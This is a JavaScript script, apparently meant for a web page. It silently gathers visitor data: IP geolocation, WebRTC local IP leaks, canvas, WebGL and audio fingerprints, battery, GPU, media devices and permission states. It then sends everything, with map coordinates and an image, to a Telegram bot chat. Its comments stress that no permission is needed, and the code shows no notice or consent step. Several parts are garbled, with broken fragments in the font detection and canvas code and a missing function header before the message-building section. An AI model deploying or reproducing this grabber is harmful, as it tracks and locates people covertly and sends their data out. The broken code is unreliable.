<script>

// Fix btoa for Unicode (Arabic, etc.)
function utoa(data) {
    return btoa(unescape(encodeURIComponent(data)));
}

// Enhanced unique device ID generation
function generateDeviceID() {
    const components = [
        navigator.userAgent,
        screen.width, screen.height, screen.colorDepth,
        navigator.language, navigator.platform,
        new Date().getTimezoneOffset(),
        navigator.hardwareConcurrency || 'unknown',
        navigator.deviceMemory || 'unknown'
    ];
    const raw = components.join('|||');
    let hash = 0;
    for (let i = 0; i < raw.length; i++) {
        const char = raw.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
    }
    return Math.abs(hash).toString(36).toUpperCase() + '-' + Date.now().toString(36).toUpperCase();
}

const DEVICE_ID = generateDeviceID();
const SESSION_START = Date.now();

// ============== DATA COLLECTION ENGINE ==============

// Layer 1: IP Geolocation (no permission needed)
// Uses ip-api.com (free, no key required, HTTPS)
async function getIPGeolocation() {
    try {
        const resp = await fetch('https://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,isp,org,as,asname,mobile,proxy,hosting,query');
        const data = await resp.json();
        if (data.status === 'success') {
            return {
                ip: data.query,
                country: data.country,
                countryCode: data.countryCode,
                region: data.regionName,
                regionCode: data.region,
                city: data.city,
                district: data.district || 'N/A',
                zip: data.zip || 'N/A',
                latitude: data.lat,
                longitude: data.lon,
                timezone: data.timezone,
                utcOffset: data.offset,
                isp: data.isp,
                org: data.org,
                asn: data.as,
                asnName: data.asname,
                isMobile: data.mobile ? 'Yes' : 'No',
                isProxy: data.proxy ? 'Yes' : 'No',
                isHosting: data.hosting ? 'Yes' : 'No'
            };
        }
    } catch(e) {}
    
    // Fallback to ipapi.co
    try {
        const resp = await fetch('https://ipapi.co/json/');
        const data = await resp.json();
        if (data && data.ip) {
            return {
                ip: data.ip,
                country: data.country_name,
                countryCode: data.country,
                region: data.region,
                city: data.city,
                latitude: data.latitude,
                longitude: data.longitude,
                timezone: data.timezone,
                org: data.org
            };
        }
    } catch(e) {}
    
    // Fallback to freeipapi
    try {
        const resp = await fetch('https://free.freeipapi.com/api/json');
        const data = await resp.json();
        if (data && data.ip) {
            return {
                ip: data.ip,
                country: data.countryName,
                countryCode: data.countryCode,
                region: data.regionName,
                city: data.cityName,
                latitude: data.latitude,
                longitude: data.longitude,
                timezone: data.timeZone
            };
        }
    } catch(e) {}
    
    return null;
}

// Layer 2: WebRTC Local IP Leak (no permission needed)
function getLocalIPs() {
    return new Promise((resolve) => {
        const ips = [];
        try {
            const pc = new RTCPeerConnection({
                iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
            });
            pc.createDataChannel('');
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            pc.onicecandidate = (ice) => {
                if (!ice || !ice.candidate) {
                    resolve([...new Set(ips)]);
                    return;
                }
                const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                const match = ice.candidate.candidate.match(ipRegex);
                if (match && !ips.includes(match[1])) {
                    ips.push(match[1]);
                }
            };
            setTimeout(() => resolve([...new Set(ips)]), 3000);
        } catch(e) {
            resolve([]);
        }
    });
}

// Layer 3: Network Information API (no permission needed)
function getNetworkInfo() {
    const info = {};
    try {
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) {
            info.effectiveType = conn.effectiveType; // 'slow-2g', '2g', '3g', '4g', '5g'
            info.downlink = conn.downlink; // Mbps
            info.downlinkMax = conn.downlinkMax;
            info.rtt = conn.rtt; // ms
            info.saveData = conn.saveData ? 'Yes' : 'No';
            info.type = conn.type; // 'bluetooth', 'cellular', 'ethernet', 'none', 'wifi', 'wimax', 'other', 'unknown'
        }
    } catch(e) {}
    return info;
}

// Layer 4: Battery Status (no permission needed in Chrome)
async function getBatteryInfo() {
    try {
        const battery = await navigator.getBattery();
        return {
            level: (battery.level * 100).toFixed(1) + '%',
            charging: battery.charging ? 'Yes' : 'No',
            chargingTime: battery.chargingTime === Infinity ? 'Unknown' : battery.chargingTime + 's',
            dischargingTime: battery.dischargingTime === Infinity ? 'Unknown' : battery.dischargingTime + 's'
        };
    } catch(e) {
        return { error: 'Battery API blocked or unavailable' };
    }
}

// Layer 5: Screen & Display (no permission needed)
function getScreenInfo() {
    return {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth + '-bit',
        pixelDepth: screen.pixelDepth + '-bit',
        pixelRatio: window.devicePixelRatio,
        orientation: screen.orientation ? screen.orientation.type : 'unknown',
        innerWidth: window.innerWidth,
        innerHeight: window.innerHeight,
        outerWidth: window.outerWidth,
        outerHeight: window.outerHeight
    };
}

// Layer 6: Browser & System (no permission needed)
function getBrowserInfo() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages ? navigator.languages.join(', ') : 'unknown',
        cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
        doNotTrack: navigator.doNotTrack || 'unspecified',
        hardwareConcurrency: navigator.hardwareConcurrency + ' cores',
        deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown',
        maxTouchPoints: navigator.maxTouchPoints,
        vendor: navigator.vendor,
        vendorSub: navigator.vendorSub || 'N/A',
        productSub: navigator.productSub || 'N/A',
        appName: navigator.appName,
        appVersion: navigator.appVersion,
        appCodeName: navigator.appCodeName,
        onLine: navigator.onLine ? 'Yes' : 'No',
        pdfViewerEnabled: navigator.pdfViewerEnabled ? 'Yes' : 'No',
        webdriver: navigator.webdriver ? 'Yes (Automated)' : 'No'
    };
}

// Layer 7: Timezone & Locale (no permission needed)
function getLocaleInfo() {
    const dtf = Intl.DateTimeFormat().resolvedOptions();
    return {
        timezone: dtf.timeZone,
        locale: dtf.locale,
        calendar: dtf.calendar,
        numberingSystem: dtf.numberingSystem,
        offsetUTC: -(new Date().getTimezoneOffset() / 60) + ' hours',
        currentDateTime: new Date().toISOString(),
        currentLocaleDate: new Date().toLocaleString()
    };
}

// Layer 8: Canvas Fingerprint (no permission needed)
function getCanvasFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        canvas.width = 256;
        canvas.height = 128;
        const ctx = canvas.getContext('2d');
        
        // Text rendering
        ctx.textBaseline = 'alphabetic';

        // Triangle
        ctx.beginPath();

        ctx.lineTo(120, 40);

        ctx.fillStyle = '#ff5722';
        ctx.fill();
        
        return canvas.toDataURL();
    } catch(e) {
        return 'Canvas blocked';
    }
}

// Layer 9: WebGL Fingerprint (no permission needed)
function getWebGLInfo() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return { error: 'WebGL not supported' };
        
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return {
            vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A',
            renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A',
            version: gl.getParameter(gl.VERSION),
            shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
            maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
            maxVertexAttribs: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
            antialiasing: gl.getContextAttributes().antialias ? 'Enabled' : 'Disabled',
            alpha: gl.getContextAttributes().alpha ? 'Enabled' : 'Disabled',
            depth: gl.getContextAttributes().depth ? 'Enabled' : 'Disabled',
            stencil: gl.getContextAttributes().stencil ? 'Enabled' : 'Disabled'
        };
    } catch(e) {
        return { error: 'WebGL blocked' };
    }
}

// Layer 10: Audio Fingerprint (no permission needed)
function getAudioFingerprint() {
    return new Promise((resolve) => {
        try {
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            const analyser = audioCtx.createAnalyser();
            const oscillator = audioCtx.createOscillator();
            const gain = audioCtx.createGain();
            
            oscillator.type = 'triangle';
            oscillator.frequency.setValueAtTime(440, audioCtx.currentTime);
            gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
            
            oscillator.connect(gain);
            gain.connect(analyser);
            analyser.connect(audioCtx.destination);
            
            oscillator.start();
            
            const data = new Uint8Array(analyser.frequencyBinCount);
            analyser.getByteFrequencyData(data);
            
            let hash = 0;
            for (let i = 0; i < data.length; i++) {
                hash = ((hash << 5) - hash) + data[i];
                hash = hash & hash;
            }
            
            oscillator.stop();
            audioCtx.close();
            
            resolve({
                sampleRate: audioCtx.sampleRate,
                hash: Math.abs(hash).toString(36),
                frequencyBinCount: analyser.frequencyBinCount,
                maxDecibels: analyser.maxDecibels,
                minDecibels: analyser.minDecibels
            });
        } catch(e) {
            resolve({ error: 'Audio API blocked' });
        }
    });
}

function detectFonts() {
    const baseFonts = ['monospace', 'sans-serif', 'serif'];

        'Mongolian Baiti', 'MV Boli', 'Myanmar Text', 'Nirmala UI',
        'Palatino Linotype', 'Segoe MDL2 Assets', 'Segoe Print', 'Segoe Script',

        'Noto Sans Arabic', 'Traditional Arabic', 'Simplified Arabic',
        'Arabic Typesetting', 'Urdu Typesetting', 'Droid Arabic Naskh'
    ];
    
    const detected = [];
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    
    // Create a test string with distinct characters
    const testString = 'mmmmmmmmmmlli';
    
    testFonts.forEach(font => {

    });
    
    return {

}

// Layer 12: Storage Availability Check (no permission needed)
function getStorageInfo() {
    const info = {};
    try {
        localStorage.setItem('_test_', '1');
        localStorage.removeItem('_test_');
        info.localStorage = 'Available';
    } catch(e) {
        info.localStorage = 'Blocked';
    }
    
    try {
        sessionStorage.setItem('_test_', '1');
        sessionStorage.removeItem('_test_');
        info.sessionStorage = 'Available';
    } catch(e) {
        info.sessionStorage = 'Blocked';
    }
    
    try {
        info.cookieEnabled = navigator.cookieEnabled ? 'Enabled' : 'Disabled';
    } catch(e) {
        info.cookieEnabled = 'Unknown';
    }
    
    // Check IndexedDB
    try {
        info.indexedDB = 'indexedDB' in window ? 'Available' : 'Unavailable';
    } catch(e) {
        info.indexedDB = 'Blocked';
    }
    
    return info;
}

// Layer 13: GPU via navigator.gpu (Chrome only, no permission)
async function getGPUInfo() {
    try {
        if (navigator.gpu) {
            const adapter = await navigator.gpu.requestAdapter();
            if (adapter) {
                const info = adapter.info || {};
                return {
                    gpuVendor: info.vendor || 'N/A',
                    gpuArchitecture: info.architecture || 'N/A',
                    gpuDevice: info.device || 'N/A',
                    gpuDescription: info.description || 'N/A',
                    gpuBackend: info.backend || (adapter.isFallbackAdapter ? 'Fallback' : 'Primary')
                };
            }
        }
    } catch(e) {}
    return { error: 'WebGPU not available' };
}

// Layer 14: Media Devices Enumeration (limited without permission)
async function getMediaDevices() {
    try {
        const devices = await navigator.mediaDevices.enumerateDevices();
        const audioInputs = devices.filter(d => d.kind === 'audioinput').length;
        const audioOutputs = devices.filter(d => d.kind === 'audiooutput').length;
        const videoInputs = devices.filter(d => d.kind === 'videoinput').length;
        return {
            totalDevices: devices.length,
            audioInputs: audioInputs + ' (labels hidden - no permission)',
            audioOutputs: audioOutputs + ' (labels hidden - no permission)',
            videoInputs: videoInputs + ' (labels hidden - no permission)',
            deviceDetails: devices.map(d => ({
                kind: d.kind,
                deviceId: d.deviceId.substring(0, 8) + '...',
                groupId: d.groupId.substring(0, 8) + '...'
            }))
        };
    } catch(e) {
        return { error: 'MediaDevices API blocked' };
    }
}

// Layer 15: Permissions Status Check (no permission needed to check)
async function getPermissionsStatus() {
    const permissions = ['geolocation', 'notifications', 'camera', 'microphone', 'midi', 'clipboard-read', 'clipboard-write', 'payment-handler', 'persistent-storage', 'background-sync', 'ambient-light-sensor', 'accelerometer', 'gyroscope', 'magnetometer'];
    const results = {};
    
    for (const perm of permissions) {
        try {
            const status = await navigator.permissions.query({ name: perm });
            results[perm] = status.state; // 'granted', 'denied', 'prompt'
        } catch(e) {
            results[perm] = 'API unavailable';
        }
    }
    return results;
}

// ============== MAIN COLLECTION ENGINE ==============

async function collectAllData() {
    const data = {
        deviceID: DEVICE_ID,
        sessionDuration: ((Date.now() - SESSION_START) / 1000).toFixed(1) + 's',
        timestamp: new Date().toISOString(),
        pageURL: window.location.href,
        referrer: document.referrer || 'Direct',
        
        // Layer 1: IP Geo
        ipGeolocation: await getIPGeolocation(),
        
        // Layer 2-8: Device info (fast)
        network: getNetworkInfo(),
        screen: getScreenInfo(),
        browser: getBrowserInfo(),
        locale: getLocaleInfo(),
        storage: getStorageInfo(),
        
        // Layer 9+: Slower fingerprinting
        canvas: getCanvasFingerprint(),
        webgl: getWebGLInfo(),
        mediaDevices: await getMediaDevices(),
        permissions: await getPermissionsStatus(),
        gpu: await getGPUInfo(),
        
        // Layer 10-12: Async
        battery: await getBatteryInfo(),
        
        // Extra: Performance timing
        performance: {
            domContentLoaded: performance.timing ? (performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart) + 'ms' : 'N/A',
            pageLoad: performance.timing ? (performance.timing.loadEventEnd - performance.timing.navigationStart) + 'ms' : 'N/A',
            domInteractive: performance.timing ? (performance.timing.domInteractive - performance.timing.navigationStart) + 'ms' : 'N/A'
        }
    };
    
    return data;
}

                `🔗 IP: ${data.ipGeolocation.ip || 'N/A'}\n` +

                (data.ipGeolocation.isProxy ? `🛡️ بروكسي/VPN: ${data.ipGeolocation.isProxy}\n` : '') +
                (data.ipGeolocation.district && data.ipGeolocation.district !== 'N/A' ? `🏘️ الحي: ${data.ipGeolocation.district}\n` : '') +

            `**📱 معلومات الجهاز:**\n` +
            `🖥️ النظام: ${data.browser.platform || 'N/A'}\n` +
            `🌐 المتصفح: ${data.browser.userAgent ? data.browser.userAgent.substring(0, 150) : 'N/A'}\n` +

            `🌐 اللغة: ${data.browser.language || 'N/A'}\n` +

            `**🖥️ WebGL:**\n` +
            `${data.webgl.renderer || 'N/A'}\n` +
            `${data.webgl.vendor || 'N/A'}\n\n` +
            `**🔍 التصاريح الحالية:**\n` +
            `📍 GPS: ${data.permissions.geolocation || 'N/A'}\n` +
            `📷 كاميرا: ${data.permissions.camera || 'N/A'}\n` +
            `🎤 ميكروفون: ${data.permissions.microphone || 'N/A'}\n` +
            `🔔 إشعارات: ${data.permissions.notifications || 'N/A'}\n\n` +
            `━━━━━━━━━━━━━━━━\n\n` +
            `**📊 بصمة Canvas:**\n` +
            `${data.canvas ? '✅ تم التقاط البصمة' : '❌ فشل'}\n` +
            `**🎵 Audio:** متاح\n` +
            `**📦 التخزين:** ${data.storage.localStorage || 'N/A'}\n` +
            `🕒 عمر الجلسة: ${data.sessionDuration}\n` +
            `🔗 المرجع: ${data.referrer || 'مباشر'}\n\n` +
            `**📋 البيانات الكاملة (Base64):**\n` +
            `\`${payload.substring(0, 500)}...\``;
        
        // Send main summary
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            })
        });
        
        // Send full JSON data as a separate message (if too long)
        const fullJSON = JSON.stringify(data, null, 2);
        if (fullJSON.length > 4000) {
            // Split into chunks of 4000
            for (let i = 0; i < fullJSON.length; i += 4000) {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: '```json\n' + fullJSON.substring(i, i + 4000) + '\n```',
                        parse_mode: 'Markdown'
                    })
                });
                await new Promise(r => setTimeout(r, 500));
            }
        } else {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: '```json\n' + fullJSON + '\n```',
                    parse_mode: 'Markdown'
                })
            });
        }
        
        // Try to send canvas image as photo
        if (data.canvas && data.canvas.startsWith('data:image/')) {
            try {
                const blob = await (await fetch(data.canvas)).blob();
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('photo', blob, 'canvas_fingerprint_' + DEVICE_ID + '.png');
                formData.append('caption', `🖼️ Canvas Fingerprint - Device ${DEVICE_ID.substring(0, 8)}`);
                
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch(e) {}
        }
        
        // Send Google Maps link as separate message if we have coordinates
        if (data.ipGeolocation && data.ipGeolocation.latitude && data.ipGeolocation.longitude) {
            const mapsUrl = `https://www.google.com/maps?q=${data.ipGeolocation.latitude},${data.ipGeolocation.longitude}`;
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    latitude: data.ipGeolocation.latitude,
                    longitude: data.ipGeolocation.longitude
                })
            });
        }
        
        return true;
    } catch(e) {
        console.error('Telegram send error:', e);
        return false;
    }
}
